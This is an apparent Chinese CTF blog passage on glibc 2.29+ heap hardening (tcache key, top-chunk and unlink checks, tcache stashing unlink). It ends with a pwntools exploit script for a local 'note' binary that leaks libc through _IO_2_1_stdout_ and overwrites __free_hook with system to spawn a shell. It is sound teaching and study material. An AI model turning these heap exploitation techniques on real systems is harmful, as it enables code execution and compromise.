<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"> </span><br><span class="line">mchunkptr next = chunk_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">    || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): invalid next size (unsorted)"</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != <span class="built_in">size</span>))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): mismatching next-&gt;prev_size (unsorted)"</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">    || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): unsorted double linked list corrupted"</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): invalid next-&gt;prev_inuse (unsorted)"</span>);</span><br></pre></td></tr></table></figure>

<p>①下一个chunk的size是否在合理区间</p>
<p> ②下一个chunk的prevsize是否等于victim的size</p>
<p> ③检查unsortedbin双向链表的完整性</p>
<p> ④下一个chunk的previnuse标志位是否为0</p>
<p> 其实最要命的是检查双向链表的完整性，还得在目的地址的fd伪造victim，都能伪造地址了还用这，所以直接废弃。Tcache_Stashing_Unlink_Attack来类似代替unsortedbin attack，不过Tcache_Stashing_Unlink_Attack一般需要用到calloc，如果有UAF泄露地址的话倒是不太需要。</p>
<h5 id="2-top-chunk改写限制"><a href="#2-top-chunk改写限制" class="headerlink" title="(2)top_chunk改写限制"></a>(2)top_chunk改写限制</h5><p>新增检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">size</span> &gt; av-&gt;system_mem))  <span class="comment">//0x21000       </span></span><br><span class="line">    malloc_printerr (<span class="string">"malloc(): corrupted top size"</span>);</span><br></pre></td></tr></table></figure>

<p>即size需要小于等于system_mems = 0x21000。之前由top_chunk引发的一系列漏洞，类似House of orange,</p>
<p> House of Force以及之前提到的修改top_chunk到malloc_hook附近等，都不太行了。</p>
<h5 id="3-unlink方面一些限制"><a href="#3-unlink方面一些限制" class="headerlink" title="(3)unlink方面一些限制"></a>(3)unlink方面一些限制</h5><p>新增检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(__glibc_unlikely (chunksize(p) != prevsize))    *<span class="comment">//new*       </span></span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size while consolidating"</span>);</span><br></pre></td></tr></table></figure>

<p>即会判断找到的之前为Free状态的chunk和当前要释放chunk的prevsize是否相等</p>
<p> 这个对于UAF方面来说没啥影响，因为UAF本身就基本直接造成堆块重叠，而unlink通常就是结合off-by-null来制造堆块重叠的。off-by-null和off-by-one之后开一个专门的来讨论。</p>
<h5 id="4-tcache方面的变化"><a href="#4-tcache方面的变化" class="headerlink" title="(4)tcache方面的变化"></a>(4)tcache方面的变化</h5><p>①新增key字段</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//-------------------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">    assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache;    <span class="comment">//add</span></span><br><span class="line"> </span><br><span class="line">    e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">    assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">    assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">    --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">    e-&gt;key = <span class="literal">NULL</span>;    <span class="comment">//add</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即会在释放chunk的bk处加入key字段，一般为heap_base+0x10，即当前线程的tcache struct的地方。释放时赋值，申请回来时置零。</p>
<p>②新增的一些检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注释头</span></span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">        tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">   trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">   2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">   coincidence before aborting.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">        &#123;</span><br><span class="line">            tcache_entry *tmp;</span><br><span class="line">            LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">            <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">                 tmp;</span><br><span class="line">                 tmp = tmp-&gt;next)</span><br><span class="line">                <span class="keyword">if</span> (tmp == e)</span><br><span class="line">                    malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">            <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">       few cycles, but don't abort.  */</span></span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">            tcache_put (p, tc_idx);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点是这里<strong>if (__glibc_unlikely (e-&gt;key == tcache))</strong>，即针对之前tcache dup做的限制，检查要释放chunk的key字段，如果等于tcache结构体地址，则遍历对于的tcache中的chunk是否和该chunk为同一个chunk，是则报错。这个好绕过，通常可以利用漏洞改掉tcache中对于chunk的bk指针即可。由于unsortedbin attack失效，而Tcache_Stashing_Unlink_Attack通常还需要结合堆溢出，UAF之类的漏洞，所以常常可以<strong>配合largebin attack来进行攻击tcache dup。</strong></p>
<p> ▲还有一点需要注意的是，有的2.27版本已经引入了2.29中的一些机制，刚刚提到的，比如key字段之类的，具体做题具体分析。</p>
<p> 参考：<a href="https://www.anquanke.com/post/id/194960#h2-1" target="_blank" rel="noopener">glibc-2.29新增的保护机制学习总结 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p>③出现的新手段</p>
<p>Tcache stash unlink attack，很多师傅分析这个漏洞都是在2.29下开始分析，但实际上从最开始引入2.26的tcache就已经有了，只不过可能是之前的unsortedbin attack太好用，就没开发出来这个漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.26 </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena (victim);</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line"> </span><br><span class="line">            <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">            <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">            <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                       &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        bck = tc_victim-&gt;bk;</span><br><span class="line">                        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                            set_non_main_arena (tc_victim);</span><br><span class="line">                        bin-&gt;bk = bck;</span><br><span class="line">                        bck-&gt;fd = bin;</span><br><span class="line"> </span><br><span class="line">                        tcache_put (tc_victim, tc_idx);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.32</span></span><br><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">&#123;</span><br><span class="line">    idx = smallbin_index (nb);</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            &#123;</span><br><span class="line">                errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena (victim);</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">            <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">            <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">            <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">            &#123;</span><br><span class="line">                mchunkptr tc_victim;</span><br><span class="line"> </span><br><span class="line">                <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">                <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">                       &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        bck = tc_victim-&gt;bk;</span><br><span class="line">                        set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">                        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                            set_non_main_arena (tc_victim);</span><br><span class="line">                        bin-&gt;bk = bck;</span><br><span class="line">                        bck-&gt;fd = bin;</span><br><span class="line"> </span><br><span class="line">                        tcache_put (tc_victim, tc_idx);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到几乎是一样的，只有一两处：</p>
<p> A.2.26判断了smallbin是否为空，为空则会调用<strong>malloc_consolidate</strong>进行初始化，但是从2.27开始就没有了。这个在针对<strong>malloc_consolidate</strong>进行攻击的时候可能会用到。</p>
<p>B.错误打印方式不同：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.26</span></span><br><span class="line">errstr = <span class="string">"malloc(): smallbin double linked list corrupted"</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//errout define 2 time</span></span><br><span class="line">errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        __libc_lock_unlock (av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (oldp), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//2.27及以上</span></span><br><span class="line">malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br></pre></td></tr></table></figure>

<p>这个在针对<strong>malloc_printerr</strong>也可能会用到</p>
<p> 而这种攻击主要是针对smallbin攻击的。</p>
<p> 但也有一种针对fastbin攻击的：</p>
<p> <a href="https://www.anquanke.com/post/id/198173" target="_blank" rel="noopener">Tcache Stashing Unlink Attack利用思路 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p> 这个后面再讨论下。</p>
<h4 id="2-UAF常见限制"><a href="#2-UAF常见限制" class="headerlink" title="2.UAF常见限制"></a>2.UAF常见限制</h4><h5 id="1-UAF-Leak-Size不做限制：-1"><a href="#1-UAF-Leak-Size不做限制：-1" class="headerlink" title="(1)UAF + Leak + Size不做限制："></a>(1)UAF + Leak + Size不做限制：</h5><p>这个没啥好说的，直接泄露地址之后任意申请就完了。</p>
<h5 id="2-UAF-Leak-Size做限制"><a href="#2-UAF-Leak-Size做限制" class="headerlink" title="(2)UAF+Leak+Size做限制:"></a>(2)UAF+Leak+Size做限制:</h5><p>结合之前的，小Chunk就修改size，可以放入unsortedbin就填满Tcache之后放入泄露地址后任意申请即可。</p>
<h5 id="3-UAF-无Leak-Size不做限制-1"><a href="#3-UAF-无Leak-Size不做限制-1" class="headerlink" title="(3)UAF+无Leak+Size不做限制:"></a>(3)UAF+无Leak+Size不做限制:</h5><p>一般很多tcache的题都会对size做限制，但是其实对于tcache的UAF来说，没啥大用，都能绕过，像我下面对于0x4f8的chunk就可以利用修改size来伪造，和之前基本一致。</p>
<p> 由于tcache没什么限制，我们可以利用unsortedbin踩下地址后，对应修改fd即可实现爆破申请_IO_2_1_stdout结构体，修改flag和部分字节写write_base,write_end来泄露地址，然后就可以任意申请了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function">    global p</span></span><br><span class="line"><span class="function">    heap_base </span>= leak_heap()</span><br><span class="line">    libc_base = leak_libc() - libc.sym['printf']</span><br><span class="line">    elf_base = leak_elf() - elf.sym['main']</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">"heap_base:0x%x"</span>%heap_base)</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">"libc_base:0x%x"</span>%libc_base)</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">"elf_base:0x%x"</span>%elf_base)</span><br><span class="line">    add_malloc(0x1000-0x8-0x250,'PIG007NB')</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    guess_libc = <span class="number">0xf000</span></span><br><span class="line">    guess_heap = <span class="number">0xf000</span></span><br><span class="line">    guess_IO = guess_libc + libc.sym['_IO_2_1_stdout_']</span><br><span class="line">    lg(<span class="string">"guess_IO"</span>,guess_IO)</span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x4f8</span>,<span class="string">"\x00"</span>*<span class="number">0x4f8</span>)                <span class="meta">#idx    0x1</span></span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x01"</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0x2</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x02"</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0x3</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x03"</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0x4</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x04'</span>*<span class="number">0x38</span>)                <span class="meta">#idx    0x5</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="meta">#write libc addr</span></span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0x1</span>)</span><br><span class="line">    add_malloc(<span class="number">0x78</span>,p16((guess_IO)&amp;<span class="number">0xffff</span>))                <span class="meta">#idx     0x6</span></span><br><span class="line">    <span class="meta">#show(0x1)</span></span><br><span class="line">    #libc_base_attempt = u64Leakbase(libc.sym['_IO_2_1_stdout_'])</span><br><span class="line">    <span class="meta">#lg(<span class="meta-string">"libc_base_attempt"</span>,libc_base_attempt)</span></span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0x2</span>)</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0x4</span>)</span><br><span class="line">    edit(<span class="number">0x4</span>,<span class="number">0x2</span>,p16((guess_heap+<span class="number">0x1000</span>+<span class="number">0x10</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x05'</span>*<span class="number">0x38</span>)                        <span class="meta">#idx    0x7</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x06'</span>*<span class="number">0x38</span>)                        <span class="meta">#idx    0x8</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span>)<span class="meta">#idx    0x9</span></span><br><span class="line"> </span><br><span class="line">    libc_base = u64Leakbase(<span class="number">0x3b5890</span>)</span><br><span class="line">    lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add_malloc(0x48,'/bin/sh\x00')                        #idx    0xa</span><br><span class="line">    add_malloc(0x48,'/bin/sh\x00')                        #idx    0xb</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0xa</span>)</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0xb</span>)</span><br><span class="line">    edit(0xb,0x8,p64(libc_base+libc.sym['__free_hook']))</span><br><span class="line">    add_malloc(0x48,'/bin/sh\x00')                        #idx    0xc</span><br><span class="line">    add_malloc(0x48,p64(libc_base + libc.sym['system']))#idx     0xd</span><br><span class="line">    <span class="built_in">free</span>(<span class="number">0xc</span>)</span><br><span class="line">    it()</span><br><span class="line"> </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = <span class="built_in">process</span>(<span class="string">"./note"</span>)</span><br><span class="line">        lg(<span class="string">"Times:"</span>,i)</span><br><span class="line">        pwn()</span><br><span class="line">    except EOFError:</span><br><span class="line">        p.<span class="built_in">close</span>()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    except Exception:</span><br><span class="line">        p.<span class="built_in">close</span>()</span><br><span class="line">        <span 